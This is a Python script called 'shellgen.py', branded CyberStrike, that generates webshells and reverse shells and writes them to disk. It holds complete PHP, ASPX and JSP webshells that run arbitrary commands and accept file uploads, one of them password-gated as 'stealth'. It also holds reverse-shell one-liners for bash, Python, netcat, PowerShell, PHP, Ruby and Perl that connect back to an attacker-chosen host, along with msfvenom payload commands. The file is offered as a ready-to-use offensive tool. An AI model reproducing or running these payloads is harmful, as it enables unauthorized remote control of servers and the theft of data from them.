#!/usr/bin/env python3
"""
shellgen.py — CyberStrike webshell + reverse shell generator
Usage:
  python shellgen.py webshell php
  python shellgen.py webshell aspx
  python shellgen.py webshell jsp
  python shellgen.py webshell php_stealth password=hunter2
  python shellgen.py webshell php_mini
  python shellgen.py reverse LHOST=10.0.0.1 LPORT=4444 SHELL=bash
  python shellgen.py reverse LHOST=10.0.0.1 LPORT=4444 SHELL=powershell
  python shellgen.py reverse LHOST=10.0.0.1 LPORT=4444 SHELL=python
  python shellgen.py reverse LHOST=10.0.0.1 LPORT=4444 SHELL=nc
  python shellgen.py reverse LHOST=10.0.0.1 LPORT=4444 SHELL=all
  python shellgen.py all LHOST=10.0.0.1 LPORT=4444
"""
import sys
import os
from datetime import datetime

# =================== WEBSHELLS ===================

WEBSHELLS = {
    "php": r"""<?php
// CyberStrike PHP webshell
// GET ?0=id  |  POST cmd=<command>  p=<password>  |  file upload f
if(isset($_REQUEST['cmd'])){
    $c=$_REQUEST['cmd'];
    if(isset($_POST['p'])&&$_POST['p']!=='PWD'){die('auth');}
    echo '<pre>'.shell_exec($c).'</pre>';
}
if(isset($_GET['0'])){
    echo '<pre>'.shell_exec($_GET['0']).'</pre>';
}
if(isset($_FILES['f'])){
    move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);
    echo 'ok:'.$_FILES['f']['name'];
}
?><form method=POST><input name=cmd placeholder=cmd><input name=p value=PWD><input type=submit></form>""",

    "aspx": r"""<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Run(object s, EventArgs e){
    Process p=new Process();
    p.StartInfo.FileName=System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("Y21k"));
    p.StartInfo.Arguments="/c "+Server.UrlDecode(Request["c"]);
    p.StartInfo.UseShellExecute=false;
    p.StartInfo.RedirectStandardOutput=true;
    p.StartInfo.RedirectStandardError=true;
    p.Start();
    out.InnerHtml="<pre>"+p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd()+"</pre>";
}
</script>
<form runat="server" onsubmit="Run(this,null);return false">
<input name="c" id="c" autofocus><input type="submit">
</form><div id="out" runat="server"></div>""",

    "jsp": r"""<%@ page import="java.util.*,java.io.*"%>
<%
String c=request.getParameter("c");
if(c!=null){
  Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
  BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
  String l;out.print("<pre>");while((l=br.readLine())!=null)out.println(l);out.print("</pre>");
}
%>
<form><input name=c autofocus><input type=submit></form>""",

    "php_stealth": r"""<?php
// password-gated — set PWD before upload
$p='PWD';
if(isset($_POST['p'])&&$_POST['p']===$p){
  echo '<pre>'.shell_exec($_POST['c']).'</pre>';
}
?>""",

    "php_mini": r"""<?php echo shell_exec($_GET['c']); ?>""",
}

# =================== REVERSE SHELLS ===================

REV = {
    "bash":       "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    "sh":         "sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    "python":     "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "python3":    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "nc":         "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
    "nc_trad":    "nc -e /bin/sh {LHOST} {LPORT}",
    "powershell": "$L=new-object net.sockets.tcpclient('{LHOST}',{LPORT});$S=$L.getstream();[byte[]]$B=0..65535|%{{0}};while(($I=$S.read($B,0,$B.length)) -ne 0){{$D=(New-Object Text.Encoding ASCII).GetString($B,0,$I);$SB=(Invoke-Expression $D 2>&1 | Out-String);$SB2=$SB+'PS '+(pwd).Path+'> ';$SB3=([text.encoding]::ASCII).GetBytes($SB2);$S.write($SB3,0,$SB3.length);$S.flush()}}",
    "php_rev":    "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "ruby":       "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{LHOST}\",{LPORT});loop{{c.gets.chomp|=(IO.popen(c.gets.chomp,\"r\"){{|io|io.read}}).lines.map{{|l|l}};c.puts($_) }}'",
    "perl":       "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    "msfvenom":   "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe",
    "msfvenom_ps":"msfvenom -p windows/x64/powershell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.ps1",
}

# =================== HELPERS ===================

BANNER = r"""
  ____           _    _              _ _
 / ___|_ __ __ _| | _| |_ ___  _ __ (_) |_
| |   | '__/ _` | |/ / __/ _ \| '_ \| | __|
| |___| | | (_| |   <| || (_) | | | | | |_
 \____|_|  \__,_|_|\_\\__\___/|_| |_|_|\__|
   shellgen v1.0 — webshell + reverse shell forge
"""

def parse_args(argv):
    out = {"LHOST": "10.0.0.1", "LPORT": "4444"}
    for a in argv[1:]:
        if "=" in a:
            k, v = a.split("=", 1)
            out[k] = v
    return out

def write_file(name, content, header=""):
    path = os.path.join(os.getcwd(), name)
    full = (f"// CyberStrike shellgen — {datetime.now().isoformat()}\n"
            f"// {header}\n\n" + content) if header else content
    with open(path, "w", encoding="utf-8", errors="ignore") as f:
        f.write(full)
    print(f"[+] wrote {path}  ({len(content)} bytes)")
    return path

# =================== COMMANDS ===================

def cmd_webshell(kind, args):
    if kind not in WEBSHELLS:
        print(f"[-] unknown shell type: {kind}")
        print(f"    available: {', '.join(WEBSHELLS.keys())}")
        return
    body = WEBSHELLS[kind]
    pwd = args.get("password", "")
    if pwd and "PWD" in body:
        body = body.replace("'PWD'", f"'{pwd}'").replace("=PWD", f"={pwd}")
    fname = f"cyber.{kind.split('_')[0]}"
    write_file(fname, body, header=f"webshell/{kind}")

def cmd_reverse(args):
    sh = args.get("SHELL", "bash").lower()
    if sh == "all":
        for k in REV:
            print(f"\n--- {k} ---")
            print(REV[k].format(**args))
        return
    if sh not in REV:
        print(f"[-] unknown shell: {sh}")
        print(f"    available: {', '.join(REV.keys())} (use SHELL=all for all)")
        return
    payload = REV[sh].format(**args)
    fname = f"rev_{sh}.txt"
    write_file(fname, payload, header=f"reverse shell / {sh} -> {args['LHOST']}:{args['LPORT']}")

def cmd_all(args):
    print("[*] generating all webshells...\n")
    for k in ["php", "aspx", "jsp", "php_mini"]:
        cmd_webshell(k, args)
    print("\n[*] generating all reverse shells...\n")
    cmd_reverse({"SHELL": "all", **args})

# =================== MAIN ===================

def main():
    if len(sys.argv) < 2:
        print(BANNER)
        print("Usage:")
        print("  shellgen webshell <php|aspx|jsp|php_mini|php_stealth> [password=...]")
        print("  shellgen reverse SHELL=<bash|sh|python|powershell|...> LHOST=<ip> LPORT=<port>")
        print("  shellgen reverse SHELL=all LHOST=<ip> LPORT=<port>")
        print("  shellgen all LHOST=<ip> LPORT=<port>")
        print()
        print("Examples:")
        print("  shellgen webshell php")
        print("  shellgen webshell php_stealth password=hunter2")
        print("  shellgen reverse SHELL=bash LHOST=10.0.0.1 LPORT=4444")
        print("  shellgen reverse SHELL=all LHOST=192.168.1.5 LPORT=9001")
        print("  shellgen all LHOST=10.0.0.1 LPORT=4444")
        sys.exit(0)

    print(BANNER)
    sub = sys.argv[1].lower()
    args = parse_args(sys.argv)

    if sub == "webshell":
        kind = sys.argv[2] if len(sys.argv) > 2 else "php"
        cmd_webshell(kind, args)
    elif sub == "reverse":
        cmd_reverse(args)
    elif sub == "all":
        cmd_all(args)
    else:
        print(f"[-] unknown command: {sub}")
        print("    use: webshell | reverse | all")

if __name__ == "__main__":
    main()
